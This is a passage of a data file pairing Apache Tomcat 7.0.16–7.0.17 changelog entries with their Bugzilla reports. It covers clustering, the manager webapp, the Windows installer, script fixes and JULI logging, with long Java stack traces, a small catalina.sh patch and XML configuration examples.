	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.ui.CompositionHandler.apply(CompositionHandler.java:124)
	at com.sun.facelets.compiler.NamespaceHandler.apply(NamespaceHandler.java:49)
	at com.sun.facelets.compiler.EncodingHandler.apply(EncodingHandler.java:39)
	at com.sun.facelets.impl.DefaultFacelet.include(DefaultFacelet.java:248)
	at com.sun.facelets.impl.DefaultFacelet.include(DefaultFacelet.java:294)
	at com.sun.facelets.impl.DefaultFacelet.include(DefaultFacelet.java:273)
	at com.sun.facelets.impl.DefaultFaceletContext.includeFacelet(DefaultFaceletContext.java:140)
	at com.sun.facelets.tag.ui.CompositionHandler.apply(CompositionHandler.java:116)
	at com.sun.facelets.compiler.NamespaceHandler.apply(NamespaceHandler.java:49)
	at com.sun.facelets.compiler.EncodingHandler.apply(EncodingHandler.java:39)
	at com.sun.facelets.impl.DefaultFacelet.apply(DefaultFacelet.java:95)
	at com.sun.facelets.FaceletViewHandler.buildView(FaceletViewHandler.java:596)
	at com.sun.facelets.FaceletViewHandler.renderView(FaceletViewHandler.java:651)
	at org.ajax4jsf.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:100)
	at org.ajax4jsf.application.AjaxViewHandler.renderView(AjaxViewHandler.java:176)
	at org.apache.myfaces.lifecycle.RenderResponseExecutor.execute(RenderResponseExecutor.java:41)
	at org.apache.myfaces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:140)
	at org.apache.myfaces.custom.ppr.PPRLifecycleWrapper.render(PPRLifecycleWrapper.java:84)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:187)
	at com.foo..client.web.servlets.FacesServletWrapper.service(FacesServletWrapper.java:125)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.ajax4jsf.webapp.BaseXMLFilter.doXmlFilter(BaseXMLFilter.java:206)
	at org.ajax4jsf.webapp.BaseFilter.handleRequest(BaseFilter.java:290)
	at org.ajax4jsf.webapp.BaseFilter.processUploadsAndHandleRequest(BaseFilter.java:388)
	at org.ajax4jsf.webapp.BaseFilter.doFilter(BaseFilter.java:515)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.myfaces.webapp.filter.ExtensionsFilter.doFilter(ExtensionsFilter.java:392)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at com.foo..client.web.filters.LoginFilter.doFilter(LoginFilter.java:219)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at com.foo..client.web.filters.CacheFilter.doFilter(CacheFilter.java:110)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at com.foo..client.web.filters.EncodingFilter.doFilter(EncodingFilter.java:54)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at com.foo..client.web.filters.TimerFilter.doFilter(TimerFilter.java:80)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:470)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51088
Cluster|Tomcat 7.0.17 (markt)|fix|51306|Avoid NPE when handleSESSION_EXPIRED is processed while handleSESSION_CREATED is being processed. (kfujino)|NPE in DeltaRequest.writeExternal(DeltaRequest.java:267) when handling remote session expiration|"Occasionally we got errors like following:
======
2011-05-30 03:40:17,697 ERROR [pool-1-thread-2] (org.apache.catalina.ha.session.DeltaManager) Manager [localhost#]: Unable to receive message through TCP channel
java.lang.NullPointerException
at java.io.ObjectOutputStream$BlockDataOutputStream.getUTFLength(ObjectOutputStream.java:2106)
at java.io.ObjectOutputStream$BlockDataOutputStream.writeUTF(ObjectOutputStream.java:1977)
at java.io.ObjectOutputStream.writeUTF(ObjectOutputStream.java:849)
at org.apache.catalina.ha.session.DeltaRequest.writeExternal(DeltaRequest.java:267)
at org.apache.catalina.ha.session.DeltaRequest.serialize(DeltaRequest.java:287)
at org.apache.catalina.ha.session.DeltaManager.serializeDeltaRequest(DeltaManager.java:716)
at org.apache.catalina.ha.session.DeltaManager.requestCompleted(DeltaManager.java:1224)
at org.apache.catalina.ha.session.DeltaSession.expire(DeltaSession.java:403)
at org.apache.catalina.ha.session.DeltaManager.handleSESSION_EXPIRED(DeltaManager.java:1546)
at org.apache.catalina.ha.session.DeltaManager.messageReceived(DeltaManager.java:1452)
at org.apache.catalina.ha.session.DeltaManager.messageDataReceived(DeltaManager.java:1173)
at org.apache.catalina.ha.session.ClusterSessionListener.messageReceived(ClusterSessionListener.java:92)
at org.apache.catalina.ha.tcp.SimpleTcpCluster.messageReceived(SimpleTcpCluster.java:901)
at org.apache.catalina.ha.tcp.SimpleTcpCluster.messageReceived(SimpleTcpCluster.java:882)
at org.apache.catalina.tribes.group.GroupChannel.messageReceived(GroupChannel.java:269)
at org.apache.catalina.tribes.group.ChannelInterceptorBase.messageReceived(ChannelInterceptorBase.java:79)
at org.apache.catalina.tribes.group.interceptors.TcpFailureDetector.messageReceived(TcpFailureDetector.java:110)
at org.apache.catalina.tribes.group.ChannelInterceptorBase.messageReceived(ChannelInterceptorBase.java:79)
at org.apache.catalina.tribes.group.ChannelInterceptorBase.messageReceived(ChannelInterceptorBase.java:79)
at org.apache.catalina.tribes.group.ChannelCoordinator.messageReceived(ChannelCoordinator.java:241)
at org.apache.catalina.tribes.transport.ReceiverBase.messageDataReceived(ReceiverBase.java:225)
at org.apache.catalina.tribes.transport.nio.NioReplicationTask.drainChannel(NioReplicationTask.java:188)
at org.apache.catalina.tribes.transport.nio.NioReplicationTask.run(NioReplicationTask.java:91)
at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
at java.lang.Thread.run(Thread.java:662) 

It looks like the functionality of Tomcat is not affected by this.

The NPE comes from trying to write null sessionId, but why does Tomcat try to send something from handling received authoritative SESSION_EXPIRED message?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51306
Cluster|Tomcat 7.0.17 (markt)|fix||Notifications of changes in session ID to other nodes in the cluster should be controlled by notifySessionListenersOnReplication rather than notifyListenersOnReplication. (markt)|||
Cluster|Tomcat 7.0.17 (markt)|fix||The change in session ID is notified to the container event listener on the backup node in cluster. This notification is controlled by notifyContainerListenersOnReplication.(kfujino)|||
Web applications|Tomcat 7.0.17 (markt)|fix||Update Maven repository information in the documentation to reflect current usage. (markt)|||
Web applications|Tomcat 7.0.17 (markt)|add|43538|Add host name and IP address to the HTML Manager application. Patch by Dennis Lundberg. (markt)|[patch] Show the hostname and IP address in the manager webapp|"We have an environment with a couple of load-balanced Tomcats fronted by httpd.
If someone accesses the manager application through the load-balancer, they will
not know which of the load-balanced Tomcats they end up at. In these situations,
and others as well, it would be nice if the manager could tell the hostname and
IP address of the machine it is running on."|https://bz.apache.org/bugzilla/show_bug.cgi?id=43538
Web applications|Tomcat 7.0.17 (markt)|fix||"Add session=""false"" directive to the index page of the ROOT web application. (kkolinko)"|||
Web applications|Tomcat 7.0.17 (markt)|fix|51443|Document the notifySessionListenersOnReplication attribute for the DeltaManager. (markt)|Cluster manager documentation gives invalid attribute name|http://tomcat.apache.org/tomcat-6.0-doc/config/cluster-manager.html#Common_Attributes talks about notifyListenersOnReplication, it must be notifySessionListenersOnReplication.|https://bz.apache.org/bugzilla/show_bug.cgi?id=51443
Web applications|Tomcat 7.0.17 (markt)|fix|51447|Viewing a back up session in the HTML Manager web application no longer changes the session to a primary session. Based on a patch provided by Eiji Takahashi. (markt)|Session type changes from Backup to Primary|"Created attachment 27223 [details]
patch

Steps to reproduce:

(1) Start 3 Tomcat instances that are using BackupManager.

(2) Run 3 HTMLManagers corresponding to each node.

(3) Run web application that has distributable in its web.xml.

(4) Click the link of the number of sessions for this application.

(5) If the displayed session type is Backup, click the link of session id.
And return to sessions list page soon.
Then, the session type change to Primary.

When the session detail page is displayed, getSessionForNameAndId() calls ctxt.getManager().findSession(), and findSession() calls session.get(id).
If the cluster is using BackupManager, ""session"" is instance of LazyReplicatedMap. And LazyReplicatedMap.get() set session type to ""primary"". 

I thought the solutions of this issue.

(A) Not use findSession(). Retrieve session information from local map.
-> see attached patch

Or
(B) Write the note as follows to the sessions list page. 
""If you click the backup type's sessionid, then the type change to primary.""

Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51447
Other|Tomcat 7.0.17 (markt)|fix|33262|Install monitor to auto-start for current user only rather than all users to be consistent with menu item creation. (markt)|Service Manager autostart should check for administrative rights|"I am running as a Power User and I can't start SM. It complains ""Application
System Error. Access is denied. Unable to open the Service Manager. [OK]""
Service Manager is autostarting from
""HKLM/Software/Microsoft/Windows/CurrentVersion/Run"", wich means it will be
started at each logon, for all the users. There are users who might not have the
right to control services. The solutions as I see it is that tomcat5w.exe should
graciously and silently exit if the user has no right to use it.
PS. I have only this machine and I am not really sure that my error message
isn't due to another causes. Those who know the source code might confirm or
infirm if tomcat5w isn't already working as requested."|https://bz.apache.org/bugzilla/show_bug.cgi?id=33262
Other|Tomcat 7.0.17 (markt)|add|40510|Provide an option to install shortcuts for the current user or all users. Also ensure registry is correctly cleaned on uninstall for 64-bit platforms. (markt)|installer does not create shortcuts for all users|"The Windows installer only creates shortcuts for the installing user. It 
should be creating shortcuts for all users."|https://bz.apache.org/bugzilla/show_bug.cgi?id=40510
Other|Tomcat 7.0.17 (markt)|add|50949|Provide the ability to specify the AJP port and service name when installing Tomcat using the Windows installer. This permits multiple instances of the same Tomcat version to be installed side-by-side. (markt)|Allow configuration of service name, AJP port, server port.|"I am using Tomcat to deploy a software application. Some customers run Windows and want Tomcat to run servlets.

For this, we use the installer provided on the site. In two situations, the standard installer does not work well enough:

1. The customer wants two installations on the same server, and therefore needs two services. For instance, one for development/test/acceptance and one for production. This can be achieved but requires manual interaction instead of just next, next, enter something finish.
2. The customer installs software for Sonicwall, also based on Tomcat. They include the standard installer and just overwrite any current service name for Tomcat 6 or 7.

To solve these deployment issues, I would like to be able to configure:

* The name and code of the Windows service to be created. For my own installations, I can then use something different of the standard name. That avoids that less intelligent installers hijack the service later, leading to a service request to me.
* The port for AJP and server. Currently, you can enter the HTTP port. That is very handy when for instance IIS is also running on the same machine. But when two Tomcat instances are running, the AJP and server port in a standard installation must also differ.

I have looked into res\tomcat.nsi. It seems to be responsible for the creation of the service and files.

In trunk around line 202 and 306 I see that the service name and display name are currently hardcoded. That would require some form of adaption.

The additional ports can probably be handled by Function configure.

I also saw that stuff is registered in the registry under SOFTWARE\Apache Software Foundation\Tomcat\@VERSION_MAJOR_MINOR@. That probably would require adaptation too to allow multiple installs without interfering them with each other. I do not know to handle that.

For the two scenarios, I think I can ask one customer to invest some amount of money, because in the long run it would save him the effort to learn administrator to use tomcat*.exe with options such as //ms."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50949
Other|Tomcat 7.0.17 (markt)|update||Clean up shell and batch scripts (improve consistency, clarify comments, add configtest command support for Windows). (rjung)|||
Other|Tomcat 7.0.17 (markt)|fix|51206|Make CATALINA_BASE visible for setenv.sh. (rjung)|CATALINA_BASE is not visible to setenv.sh|"If this variable is not visible, it makes the setenv.sh script sort of useless

Index: bin/catalina.sh
===================================================================
--- bin/catalina.sh	(revision 1103812)
+++ bin/catalina.sh	(working copy)
@@ -116,6 +116,9 @@
 # Ensure that any user defined CLASSPATH variables are not used on startup,
 # but allow them to be specified in setenv.sh, in rare case when it is needed.
 CLASSPATH=
+if [ -z ""$CATALINA_BASE"" ] ; then
+  CATALINA_BASE=""$CATALINA_HOME""
+fi
 
 if [ -r ""$CATALINA_BASE""/bin/setenv.sh ]; then
   . ""$CATALINA_BASE""/bin/setenv.sh
@@ -163,10 +166,8 @@
   fi
 fi
 
-if [ -z ""$CATALINA_BASE"" ] ; then
-  CATALINA_BASE=""$CATALINA_HOME""
-fi
 
+
 # Add tomcat-juli.jar and bootstrap.jar to classpath
 # tomcat-juli.jar can be over-ridden per instance
 if [ ! -z ""$CLASSPATH"" ] ; then"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51206
Other|Tomcat 7.0.17 (markt)|update||Remove unnecessary variable BASEDIR from scripts. (rjung)|||
Other|Tomcat 7.0.17 (markt)|fix||51425, 51450: Update Spanish translations. Based on patches provided by Jesus Marin. (markt)|"Spanish translation ""_es.properties"" files"|"Created attachment 27199 [details]
Spanish translation

New Spanish translations for Tomcat 7, trunk release."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51425
Catalina|Tomcat 7.0.16 (markt)|fix|51249|Further improve system property replacement code in ClassLoaderLogManager of Tomcat JULI to cover some corner cases. (kkolinko)|JULI ClassLoaderLogManager doesn't properly handle ${} when replacing property values|"when the LogManager does it's replace of ${property} it doesn't handle properly the fact that a } could exist before ${.

The indexOf for the char } should be relative to the start position of ${

Example of string : %{custom.property.matching} ${system.property.tomcat}

This would throw an exception about the index } being before ${

This is valid for all the 7.* versions as well as all the 6.* versions (validated from 6.0.27 and above).

There is not even a way to ""escape"" the ${} chars if we'd like to output them."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51249
Catalina|Tomcat 7.0.16 (markt)|fix|51264|Improve the previous fix for this issue by returning the connection to the pool when not in use so it does not appear to be an abandoned connection. Patch provided by Felix Schumacher. (markt)|Context/Manager/Store configuration proposal|"Why is it the Persistent Store Store element does not contain a means to reference a database link defined in the globalnamingresources, for example:

This is what is required

<?xml version=""1.0"" encoding=""UTF-8""?>
<Context path=""/App1"" docbase="" App1"" reloadable=""false"" crossContext=""true"" debug=""1"">
    <Manager className=""org.apache.catalina.session.PersistentManager"" distributable=""true"" maxIdleBackup=""5"">
      <Store className=""org.apache.catalina.session.JDBCStore"" connectionURL=""jdbc:oracle:thin:username/password@servername:port:schema""
        driverName=""oracle.jdbc.OracleDriver"" sessionAppCol=""app_name"" sessionDataCol=""session_data"" 
        sessionIdCol=""session_id"" sessionLastAccessedCol=""last_access"" sessionMaxInactiveCol=""max_inactive""
        sessionTable=""tomcat_sessions"" sessionValidCol=""valid_session"" />
    </Manager>
    <ResourceLink global=""jdbc/dbName"" name=""jdbc/dbName"" type=""javax.sql.DataSource""/>
</Context>

BUT couldn‚Äôt the tomcat accept this?

<?xml version=""1.0"" encoding=""UTF-8""?>
<Context path=""/App1"" docbase="" App1"" reloadable=""false"" crossContext=""true"" debug=""1"">
    <Manager className=""org.apache.catalina.session.PersistentManager"" distributable=""true"" maxIdleBackup=""5"">
      <Store className=""org.apache.catalina.session.JDBCStore"" resourceLink=""jdbc/dbName""
        resourceType=""javax.sql.DataSource"" sessionAppCol=""app_name"" sessionDataCol=""session_data"" 
        sessionIdCol=""session_id"" sessionLastAccessedCol=""last_access"" sessionMaxInactiveCol=""max_inactive""
        sessionTable=""tomcat_sessions"" sessionValidCol=""valid_session"" />
    </Manager>
    <ResourceLink global=""jdbc/dbName"" name=""jdbc/dbName"" type=""javax.sql.DataSource""/>
</Context>

That way the application developer does not need to know the username and password to the production database server nor does it need to be packaged in his/her war file."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51264
Catalina|Tomcat 7.0.16 (markt)|fix|51324|Improve handling of exceptions when flushing the response buffer to ensure that the doFlush flag does not get stuck in the enabled state. Patch provided by Jeremy Norris. (markt)|When OutputBuffer.doFlush gets Exception, doFlush gets stuck to true|"Created attachment 27114 [details]
The line that causes doFlush to be stuck at true if it gets an exception

First time opening a bug, please forgive me if this report isn't perfect!

I recently ran into an issue where OutputBuffer's doFlush gets stuck to true.

In OutputBuffer.doFlush(boolean) it sets doFlush = true, then calls bb.flushBuffer, then sets doFlush = false.

I issue I ran into was bb.flushBuffer eventually calls OutputBuffer.realWriteBytes.  The realWriteBytes eventually calls coyoteResponse.doWrite.  If coyoteResponse.doWrite throws an IOException, then it rethrows a ClientAbortException.

What I am seeing is my client disconnecting early, and causing the doWrite to throw a SocketException of ""Broken pipe"".  That broken pipe causes a ClientAbortException to be thrown. 

When that is thrown, the error is bubbled up and doFlush is stuck as ""true"".  The next time the processor is used, it calls the recycle() method in OutputBuffer. However, the recycle doesn't reset doFlush so its still set to true.

I imagine there are quite a few ways to fix this, but the two obvious ones that come to mind are:

- Have recycle() set doFlush back to false

or 

- Have throw a finally in try/catch/finally in OutputBuffer.doFlush so doFlush is set back to false when an Exception is catch"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51324
Catalina|Tomcat 7.0.16 (markt)|fix||Correct a regression in the fix for 51278 that prevented any web application from being marked as distributable. (kfujino/markt)|Unable to override default servlet other than in main web.xml|The default web.xml gets merged into the application's web.xml before processing of fragments, annotations and ServletContextInitializers. This means it can only be overridden in the application's web.xml. It should be possible to override in fragments, annotations and ServletContextInitializers.|https://bz.apache.org/bugzilla/show_bug.cgi?id=51278
Catalina|Tomcat 7.0.16 (markt)|fix||Correct a regression in the fix for 51278 that prevented a web application from overriding the default welcome files. (markt)|Unable to override default servlet other than in main web.xml|The default web.xml gets merged into the application's web.xml before processing of fragments, annotations and ServletContextInitializers. This means it can only be overridden in the application's web.xml. It should be possible to override in fragments, annotations and ServletContextInitializers.|https://bz.apache.org/bugzilla/show_bug.cgi?id=51278
Catalina|Tomcat 7.0.16 (markt)|fix||Enable remaining valves for Servlet 3 asynchronous processing support. (markt)|||
Catalina|Tomcat 7.0.16 (markt)|fix||Avoid possible NPE when logging requests received during embedded Tomcat shutdown. (markt)|||
Catalina|Tomcat 7.0.16 (markt)|fix|51340|Fix thread-safety issue when parsing multiple web.xml files in parallel. Apache Tomcat does not do this but products that embed it may. (markt)|Intermittent java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence|"An Eclipse Virgo CI build recently failed with the stack trace below. I
haven't seen the problem before, but it seems that at least
one user of vanilla Tomcat has hit the same problem, on Tomcat 6 in 2009 ([1]).

I am raising this bug to get this on the record and perhaps to help identify a pattern of usage that may ultimately lead to a solution.

It is possible that the bug is in the JRE XML processing, of course.

Environment:

Java 6 R21 64 bit (Sun)
Sles 11 x86-64
Tomcat 7.0.12 embedded in development version of Eclipse Virgo 3.0

[1] http://mail-archives.apache.org/mod_mbox/tomcat-users/200902.mbox/%3C36E4692623C5974BA6661C0B18EE8EDFE4138B@MAILSERV.hcrest.com%3E

[2011-06-07 11:07:17.741] ERROR start-signalling-4           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.tomcat.util.digester.Digester startElement 
[2011-06-07 11:07:17.741] ERROR start-signalling-4           System.err                                                        SEVERE: Begin event threw exception 
[2011-06-07 11:07:17.741] ERROR start-signalling-4           System.err                                                        java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.SetSessionConfig.begin(WebRuleSet.java:722) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1282) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1363) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808) 
[2011-06-07 11:07:17.742] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1543) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1694) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1197) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:882) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:317) 
[2011-06-07 11:07:17.743] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5081) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:787) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.eclipse.gemini.web.tomcat.internal.TomcatServletContainer.startWebApplication(TomcatServletContainer.java:122) 
[2011-06-07 11:07:17.744] ERROR start-signalling-4           System.err                                                        	at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:91) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:122) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.StandardArtifactStateMonitor.onStarted(StandardArtifactStateMonitor.java:247) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.asyncStartSucceeded(AbstractInstallArtifact.java:294) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.access$0(AbstractInstallArtifact.java:291) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact$StateMonitorSignal.signalSuccessfulCompletion(AbstractInstallArtifact.java:229) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.core.internal.BundleStartTracker$1.run(BundleStartTracker.java:143) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
[2011-06-07 11:07:17.745] ERROR start-signalling-4           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
[2011-06-07 11:07:17.746] ERROR start-signalling-4           System.err                                                        	at java.lang.Thread.run(Thread.java:619) 
[2011-06-07 11:07:17.747] ERROR start-signalling-4           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.catalina.startup.ContextConfig parseWebXml 
[2011-06-07 11:07:17.748] ERROR start-signalling-4           System.err                                                        SEVERE: Parse error in application web.xml file at file:/opt/users/hudsonbuild/workspace/virgo.web-server.snapshot/org.eclipse.virgo.server.smoketest/target/test-expanded/virgo-tomcat-server-3.0.0.CI-2011-06-07_11-01-11/work/org.eclipse.virgo.kernel.deployer_3.0.0.D-20110603101321/staging/global/bundle/org.eclipse.gemini.web.tomcat/2.0.0.BUILD-20110603145554/org.eclipse.gemini.web.tomcat-2.0.0.BUILD-20110603145554.jar/conf/web.xml 
[2011-06-07 11:07:17.748] ERROR start-signalling-4           System.err                                                        java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence 
[2011-06-07 11:07:17.748] ERROR start-signalling-4           System.err                                                        	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2687) 
[2011-06-07 11:07:17.748] ERROR start-signalling-4           System.err                                                        	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2713) 
[2011-06-07 11:07:17.748] ERROR start-signalling-4           System.err                                                        	at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1285) 
[2011-06-07 11:07:17.748] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1363) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119) 
[2011-06-07 11:07:17.749] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1543) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1694) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1197) 
